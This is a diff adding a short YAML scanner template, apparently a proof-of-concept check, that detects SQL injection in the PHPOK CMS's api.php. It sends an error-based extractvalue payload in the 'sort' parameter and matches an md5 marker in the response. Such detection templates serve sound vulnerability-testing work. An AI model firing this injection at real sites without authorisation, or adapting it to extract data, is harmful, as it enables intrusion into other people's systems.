@@ -1,0 +1,12 @@
+name: poc-yaml-phpok-sqli
+set:
+  r1: randomInt(800000000, 1000000000)
+rules:
+  - method: GET
+    path: "/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{r1}}))) --+"
+    expression: |
+      response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
+detail:
+  author: jinqi
+  links:
+    - https://github.com/jinqi520
